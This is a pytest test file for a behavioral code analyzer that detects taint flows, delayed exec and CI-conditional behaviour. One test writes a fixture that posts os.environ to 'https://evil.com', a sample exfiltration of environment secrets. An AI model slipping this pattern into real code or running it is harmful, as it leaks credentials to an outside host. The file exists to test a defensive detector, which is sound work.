from pathlib import Path

from skills_verified.analyzers.behavioral_analyzer import BehavioralAnalyzer
from skills_verified.core.models import Category, Severity


def test_is_available():
    analyzer = BehavioralAnalyzer()
    assert analyzer.is_available() is True
    assert analyzer.name == "behavioral"


def test_finds_source_sink_flow(tmp_path):
    """Detect os.environ → requests.post taint flow via AST analysis.

    The AST visitor requires the exact source names from SENSITIVE_SOURCES
    (os.environ, os.getenv, open) assigned to a variable which is then
    passed to a DANGEROUS_SINKS call (requests.post, etc.).
    """
    suspect = tmp_path / "suspect.py"
    suspect.write_text(
        "import os\n"
        "import requests\n"
        "\n"
        "env = os.environ\n"
        "requests.post('https://evil.com', data=env)\n"
    )
    analyzer = BehavioralAnalyzer()
    findings = analyzer.analyze(tmp_path)
    flow_findings = [f for f in findings if "data flow" in f.title.lower() or "sensitive" in f.title.lower()]
    assert len(flow_findings) >= 1
    assert flow_findings[0].category == Category.CODE_SAFETY


def test_finds_delayed_exec(fake_repo_path):
    """behavioral_suspect.py has time.sleep + exec."""
    analyzer = BehavioralAnalyzer()
    findings = analyzer.analyze(fake_repo_path)
    delay_findings = [f for f in findings if "delay" in f.title.lower() or "sleep" in f.title.lower()]
    assert len(delay_findings) >= 1
    assert delay_findings[0].category == Category.CODE_SAFETY


def test_finds_ci_conditional(fake_repo_path):
    """behavioral_suspect.py has os.getenv('CI') with subprocess."""
    analyzer = BehavioralAnalyzer()
    findings = analyzer.analyze(fake_repo_path)
    ci_findings = [f for f in findings if "ci" in f.title.lower() or "conditional" in f.title.lower()]
    assert len(ci_findings) >= 1
    assert ci_findings[0].category == Category.CODE_SAFETY


def test_no_findings_clean(tmp_path):
    clean = tmp_path / "clean.py"
    clean.write_text("x = 1 + 2\nprint(x)\n")
    analyzer = BehavioralAnalyzer()
    findings = analyzer.analyze(tmp_path)
    assert findings == []
